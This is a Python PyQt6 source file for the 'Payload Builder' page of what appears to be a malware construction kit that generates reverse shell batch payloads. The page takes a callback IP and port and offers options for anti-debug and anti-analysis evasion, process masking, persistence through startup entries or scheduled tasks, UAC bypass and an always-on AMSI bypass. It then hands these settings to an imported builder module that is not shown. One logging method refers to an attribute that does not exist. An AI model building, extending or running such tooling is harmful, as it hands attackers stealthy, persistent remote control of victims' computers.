from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                           QPushButton, QFrame, QLineEdit, QTableWidgetItem,
                           QCheckBox, QScrollArea, QGridLayout, QSpinBox,
                           QTextEdit, QStatusBar)  # Added QTextEdit and QStatusBar
from PyQt6.QtCore import QTimer
from PyQt6.QtGui import QColor
import logging
from datetime import datetime
from pathlib import Path
from .client_table import ClientTable

# Import the builder components
from builder import EnhancedBatchBuilder, BatchConfig

class StyledCheckBox(QCheckBox):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setStyleSheet("""
            QCheckBox {
                color: white;
                spacing: 8px;
                padding: 5px;
                border-radius: 4px;
            }
            QCheckBox:hover {
                background-color: rgba(255, 255, 255, 0.1);
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
                border-radius: 4px;
                border: 2px solid #4fd1c5;
                background: rgba(45, 55, 72, 0.5);
            }
            QCheckBox::indicator:checked {
                background: #4fd1c5;
                image: url(assets/check.png);
            }
            QCheckBox::indicator:hover {
                border-color: #81e6d9;
            }
            QCheckBox:disabled {
                color: rgba(255, 255, 255, 0.3);
            }
        """)

class FeatureCard(QFrame):
    def __init__(self, title, icon, parent=None):
        super().__init__(parent)
        self.title = title
        self.icon = icon
        self.setup_ui()

    def setup_ui(self):
        self.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #2C5282, stop:1 #2A4365);
                border-radius: 15px;
                padding: 15px;
                margin: 5px;
            }
            QLabel {
                color: white;
            }
        """)
        
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        
        # Header
        header = QLabel(f"{self.icon} {self.title}")
        header.setStyleSheet("""
            font-size: 16px;
            font-weight: bold;
            padding: 5px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        """)
        layout.addWidget(header)
        
        # Content frame
        self.content_layout = QVBoxLayout()
        layout.addLayout(self.content_layout)
        
    def add_option(self, checkbox: StyledCheckBox):
        self.content_layout.addWidget(checkbox)

class ConfigCard(QFrame):
    def __init__(self, title, icon="🛠️"):
        super().__init__()
        self.title = title
        self.icon = icon
        self.setup_ui()
        
    def setup_ui(self):
        self.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #38B2AC, stop:1 #319795);
                border-radius: 15px;
                padding: 20px;
            }
            QLabel {
                color: white;
            }
            QLineEdit, QSpinBox, QComboBox {
                background-color: rgba(45, 55, 72, 0.5);
                border: none;
                padding: 8px;
                border-radius: 5px;
                color: white;
            }
            QLineEdit:focus, QSpinBox:focus, QComboBox:focus {
                background-color: rgba(45, 55, 72, 0.8);
            }
        """)
        
        layout = QVBoxLayout(self)
        
        # Header with icon
        header = QLabel(f"{self.icon} {self.title}")
        header.setStyleSheet("""
            font-size: 18px;
            font-weight: bold;
            color: white;
            padding-bottom: 10px;
        """)
        layout.addWidget(header)

class BuildOptions(QFrame):
    def __init__(self):
        super().__init__()
        self.setup_ui()
        
    def setup_ui(self):
        self.setStyleSheet("""
            QFrame {
                background-color: #1a2234;
                border-radius: 15px;
                padding: 20px;
            }
            QLineEdit, QSpinBox {
                background-color: rgba(45, 55, 72, 0.5);
                border: 2px solid #4fd1c5;
                padding: 8px;
                border-radius: 5px;
                color: white;
                font-size: 14px;
            }
            QLineEdit:focus, QSpinBox:focus {
                border-color: #81e6d9;
                background-color: rgba(45, 55, 72, 0.8);
            }
            QLabel {
                color: white;
                font-size: 14px;
            }
        """)
        
        # Main layout with scroll area
        main_layout = QVBoxLayout(self)
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background-color: transparent;
            }
            QScrollBar:vertical {
                border: none;
                background: rgba(255, 255, 255, 0.1);
                width: 10px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #4fd1c5;
                border-radius: 5px;
                min-height: 20px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
        """)
        
        content_widget = QWidget()
        layout = QGridLayout(content_widget)
        layout.setSpacing(20)
        
        # Connection Settings Card
        connection_card = FeatureCard("Connection Settings", "🌐")
        conn_layout = QGridLayout()
        
        # IP Input
        ip_label = QLabel("IP Address:")
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Enter IP address")
        conn_layout.addWidget(ip_label, 0, 0)
        conn_layout.addWidget(self.ip_input, 0, 1)
        
        # Port Input
        port_label = QLabel("Port:")
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(4444)
        conn_layout.addWidget(port_label, 1, 0)
        conn_layout.addWidget(self.port_input, 1, 1)
        
        connection_widget = QWidget()
        connection_widget.setLayout(conn_layout)
        connection_card.content_layout.addWidget(connection_widget)
        layout.addWidget(connection_card, 0, 0)
        
        # Evasion Settings Card
        evasion_card = FeatureCard("Evasion Features", "🛡️")
        self.process_masking = StyledCheckBox("Process Masking")
        self.memory_rand = StyledCheckBox("Memory Randomization")
        self.anti_debug = StyledCheckBox("Anti-Debug")
        self.anti_analysis = StyledCheckBox("Anti-Analysis")
        
        for checkbox in [self.process_masking, self.memory_rand, self.anti_debug, self.anti_analysis]:
            evasion_card.add_option(checkbox)
        layout.addWidget(evasion_card, 0, 1)
        
        # Persistence Card
        persistence_card = FeatureCard("Persistence Options", "🔄")
        self.persistence_enabled = StyledCheckBox("Enable Persistence")
        self.startup_persist = StyledCheckBox("Startup Persistence")
        self.scheduled_task = StyledCheckBox("Scheduled Task")
        
        for checkbox in [self.persistence_enabled, self.startup_persist, self.scheduled_task]:
            persistence_card.add_option(checkbox)
        layout.addWidget(persistence_card, 1, 0, 1, 2)
        
        # Advanced Options Card
        advanced_card = FeatureCard("Advanced Options", "⚙️")
        self.dev_mode = StyledCheckBox("Developer Mode (Non-Stealthy)")
        self.keystroke_sim = StyledCheckBox("Keystroke Simulation")
        self.env_checks = StyledCheckBox("Environment Checks")
        self.uac_bypass = StyledCheckBox("UAC Bypass")
        
        for checkbox in [self.dev_mode, self.keystroke_sim, self.env_checks, self.uac_bypass]:
            advanced_card.add_option(checkbox)
            
        # Add help text for developer mode
        dev_mode_help = QLabel("Developer mode shows debug output and disables stealth features")
        dev_mode_help.setStyleSheet("""
            color: rgba(255, 255, 255, 0.6);
            font-size: 12px;
            padding-left: 26px;
        """)
        advanced_card.content_layout.addWidget(dev_mode_help)
        layout.addWidget(advanced_card, 2, 0, 1, 2)
        
        # Connect signals
        self.persistence_enabled.stateChanged.connect(self._handle_persistence_change)
        self.dev_mode.stateChanged.connect(self._handle_dev_mode_change)
        
        scroll.setWidget(content_widget)
        main_layout.addWidget(scroll)

    def _handle_persistence_change(self, state):
        """Handle persistence checkbox state changes"""
        enabled = bool(state)
        self.startup_persist.setEnabled(enabled)
        self.scheduled_task.setEnabled(enabled)
        
        if not enabled:
            self.startup_persist.setChecked(False)
            self.scheduled_task.setChecked(False)

    def _handle_dev_mode_change(self, state):
        """Handle developer mode toggle"""
        is_dev_mode = bool(state)
        self.process_masking.setEnabled(not is_dev_mode)
        self.anti_debug.setEnabled(not is_dev_mode)
        self.anti_analysis.setEnabled(not is_dev_mode)
        
        if is_dev_mode:
            self.process_masking.setChecked(False)
            self.anti_debug.setChecked(False)
            self.anti_analysis.setChecked(False)

class BuilderPage(QWidget):
    def __init__(self):
        super().__init__()
        self.setup_ui()  # Setup UI first to create log_text
        self.setup_logger()  # Then setup logger
        self.builder = EnhancedBatchBuilder()  # Then initialize builder
        self.set_default_config()  # Finally set defaults

    def setup_logger(self):
        """Initialize the logger"""
        self.logger = BuildLogger(self.log_text) if hasattr(self, 'log_text') else None

    def get_config(self):
            """Get current build configuration"""
            return {
                'ip': self.build_options.ip_input.text(),
                'port': self.build_options.port_input.value(),
                'process_masking': self.build_options.process_masking.isChecked(),
                'memory_randomization': self.build_options.memory_rand.isChecked(),
                'anti_debug': self.build_options.anti_debug.isChecked(),
                'anti_analysis': self.build_options.anti_analysis.isChecked(),
                'persistence': self.build_options.persistence_enabled.isChecked(),
                'startup_persistence': self.build_options.startup_persist.isChecked(),
                'scheduled_task': self.build_options.scheduled_task.isChecked(),
                'keystroke_simulation': self.build_options.keystroke_sim.isChecked(),
                'env_checks': self.build_options.env_checks.isChecked(),
                'uac_bypass': self.build_options.uac_bypass.isChecked(),
                'stealthy': not self.build_options.dev_mode.isChecked()  # Inverse of dev mode
            }

    def set_default_config(self):
        """Set default configuration values"""
        # Set IP and Port - Updated to use the correct IP
        self.build_options.ip_input.setText("192.168.100.4")  # Changed from 10.10.10.10
        self.build_options.port_input.setValue(4444)
        
        # Set Evasion Options
        self.build_options.process_masking.setChecked(True)
        self.build_options.memory_rand.setChecked(True)
        self.build_options.anti_debug.setChecked(True)
        self.build_options.anti_analysis.setChecked(True)
        
        # Set Persistence Options
        self.build_options.persistence_enabled.setChecked(False)  # Changed to False for testing
        self.build_options.startup_persist.setChecked(False)     # Changed to False for testing
        self.build_options.scheduled_task.setChecked(False)      # Changed to False for testing
        
        # Set Advanced Options
        self.build_options.dev_mode.setChecked(True)            # Changed to True for testing
        self.build_options.keystroke_sim.setChecked(False)      # Changed to False for testing
        self.build_options.env_checks.setChecked(False)         # Changed to False for testing
        self.build_options.uac_bypass.setChecked(False)
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)
        
        # Header with title and status
        header_layout = QHBoxLayout()
        
        # Title
        title_layout = QVBoxLayout()
        header = QLabel("Payload Builder")
        header.setStyleSheet("""
            color: white;
            font-size: 32px;
            font-weight: bold;
        """)
        subtitle = QLabel("Build customized reverse shell payloads")
        subtitle.setStyleSheet("color: rgba(255, 255, 255, 0.6); font-size: 14px;")
        title_layout.addWidget(header)
        title_layout.addWidget(subtitle)
        header_layout.addLayout(title_layout)
        
        # Status and Build Button
        status_build_layout = QHBoxLayout()
        
        self.status_label = QLabel("Ready to build")
        self.status_label.setStyleSheet("""
            color: #68D391;
            font-size: 16px;
            padding: 8px 15px;
            background: rgba(104, 211, 145, 0.1);
            border-radius: 20px;
        """)
        status_build_layout.addWidget(self.status_label)
        status_build_layout.addSpacing(20)
        
        # Build button
        self.build_button = QPushButton("⚡ Generate Payload")
        self.build_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #38B2AC, stop:1 #319795);
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #319795, stop:1 #2C7A7B);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #2C7A7B, stop:1 #285E61);
            }
        """)
        status_build_layout.addWidget(self.build_button)
        
        header_layout.addStretch()
        header_layout.addLayout(status_build_layout)
        layout.addLayout(header_layout)
        
        # Build options
        self.build_options = BuildOptions()
        layout.addWidget(self.build_options)
        
        # Output log
        log_frame = QFrame()
        log_frame.setStyleSheet("""
            QFrame {
                background-color: #1a2234;
                border-radius: 15px;
                padding: 20px;
            }
        """)
        log_layout = QVBoxLayout(log_frame)
        
        log_header = QLabel("🔍 Build Log")
        log_header.setStyleSheet("color: white; font-size: 18px; font-weight: bold;")
        log_layout.addWidget(log_header)
        
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("""
            QTextEdit {
                background-color: #0f172a;
                border: none;
                border-radius: 8px;
                color: #4fd1c5;
                font-family: 'Consolas', monospace;
                padding: 10px;
                line-height: 1.4;
            }
        """)
        log_layout.addWidget(self.log_text)
        
        layout.addWidget(log_frame)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.status_bar.setStyleSheet("""
            QStatusBar {
                color: rgba(255, 255, 255, 0.6);
                background: transparent;
            }
        """)
        layout.addWidget(self.status_bar)
        
        # Connect signals
        self.build_button.clicked.connect(self.generate_payload)

    def generate_payload(self):
        """Handle batch payload generation with validation"""
        try:
            # Validate configuration
            valid, message = self.validate_config()
            if not valid:
                self.logger.log(message, "ERROR")
                self.status_label.setText("Configuration Error")
                self.status_label.setStyleSheet("""
                    color: #FC8181;
                    font-size: 16px;
                    padding: 8px 15px;
                    background: rgba(252, 129, 129, 0.1);
                    border-radius: 20px;
                """)
                return

            # Update status
            self.status_label.setText("Building payload...")
            self.status_label.setStyleSheet("""
                color: #F6E05E;
                font-size: 16px;
                padding: 8px 15px;
                background: rgba(246, 224, 94, 0.1);
                border-radius: 20px;
            """)
            
            # Create output directory if it doesn't exist
            output_dir = Path("generated_payloads")
            output_dir.mkdir(exist_ok=True)
            
            # Get configuration from UI
            config = BatchConfig(
                ip=self.build_options.ip_input.text(),
                port=self.build_options.port_input.value(),
                process_masking=self.build_options.process_masking.isChecked(),
                memory_randomization=self.build_options.memory_rand.isChecked(),
                anti_analysis=self.build_options.anti_analysis.isChecked(),
                anti_debug=self.build_options.anti_debug.isChecked(),
                sleep_interval=30,
                max_retries=3,
                process_migration=False,
                target_process="explorer.exe",
                persistence=self.build_options.persistence_enabled.isChecked(),
                amsi_bypass=True,
                env_checks=self.build_options.env_checks.isChecked(),
                output_dir=str(output_dir),
                stealthy=not self.build_options.dev_mode.isChecked()
            )
            
            # Log configuration
            self.logger.log('Initializing payload builder...')
            self.logger.log(f'Target: {config.ip}:{config.port}')
            self.logger.log('Configuration:')
            self.logger.log(f'  - Process Masking: {config.process_masking}')
            self.logger.log(f'  - Memory Randomization: {config.memory_randomization}')
            self.logger.log(f'  - Anti-Analysis: {config.anti_analysis}')
            self.logger.log(f'  - Anti-Debug: {config.anti_debug}')
            self.logger.log(f'  - Persistence: {config.persistence}')
            self.logger.log(f'  - Environment Checks: {config.env_checks}')
            self.logger.log(f'  - Stealth Mode: {config.stealthy}')
            
            # Generate the payload file
            self.logger.log('Generating batch payload...')
            payload_path = self.builder.generate_payload_file(config)
            
            # Log success
            self.logger.log('Payload generated successfully', "SUCCESS")
            self.logger.log(f'Payload saved to: {payload_path.absolute()}')
            
            # Update status
            self.status_label.setText("Build successful!")
            self.status_label.setStyleSheet("""
                color: #68D391;
                font-size: 16px;
                padding: 8px 15px;
                background: rgba(104, 211, 145, 0.1);
                border-radius: 20px;
            """)
            
        except Exception as e:
            # Update status for error
            self.status_label.setText("Build failed!")
            self.status_label.setStyleSheet("""
                color: #FC8181;
                font-size: 16px;
                padding: 8px 15px;
                background: rgba(252, 129, 129, 0.1);
                border-radius: 20px;
            """)
            self.logger.log(f'Error: {str(e)}', "ERROR")
            
            # Log full traceback in debug mode
            if self.build_options.dev_mode.isChecked():
                import traceback
                self.logger.log(f'Traceback:\n{traceback.format_exc()}', "ERROR")

    def validate_config(self) -> tuple[bool, str]:
        """Validate the current configuration before building"""
        # IP validation
        ip = self.build_options.ip_input.text()
        if not ip:
            return False, "IP address is required"
        
        # Split IP and validate each octet
        try:
            octets = ip.split('.')
            if len(octets) != 4:
                return False, "Invalid IP address format"
            for octet in octets:
                num = int(octet)
                if num < 0 or num > 255:
                    return False, "IP address octets must be between 0 and 255"
        except ValueError:
            return False, "Invalid IP address format"

        # Port validation
        port = self.build_options.port_input.value()
        if port <= 0 or port > 65535:
            return False, "Port must be between 1 and 65535"
        
        # Persistence validation
        if self.build_options.persistence_enabled.isChecked():
            if not (self.build_options.startup_persist.isChecked() or 
                    self.build_options.scheduled_task.isChecked()):
                return False, "At least one persistence method must be selected"
        
        return True, ""

    def cleanup(self):
        """Clean up resources when closing"""
        try:
            # Clean up any temporary files
            temp_dir = Path("temp")
            if temp_dir.exists():
                import shutil
                shutil.rmtree(temp_dir)
        except Exception as e:
            self.logger.log(f"Cleanup error: {str(e)}", "ERROR")

# 2. Add better logging handler
class BuildLogger:
    def __init__(self, text_widget: QTextEdit):
        self.text_widget = text_widget
    
    def log(self, message: str, level: str = "INFO"):
        """Add formatted message to log with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {
            "INFO": "#4fd1c5",
            "SUCCESS": "#68D391",
            "ERROR": "#FC8181",
            "WARNING": "#F6E05E"
        }.get(level, "#4fd1c5")
        
        html = f'<span style="color: {color}">[{timestamp}] [{level}] {message}</span>'
        self.text_widget.append(html)
        # Auto-scroll to bottom
        self.text_widget.verticalScrollBar().setValue(
            self.text_widget.verticalScrollBar().maximum()
        )

    def add_log(self, message: str, level: str = "INFO"):
        """Add formatted message to log"""
        color = {
            "INFO": "#4fd1c5",
            "SUCCESS": "#68D391",
            "ERROR": "#FC8181",
            "WARNING": "#F6E05E"
        }.get(level, "#4fd1c5")
        
        self.log_text.append(f'<span style="color: {color}">[{level}] {message}</span>')
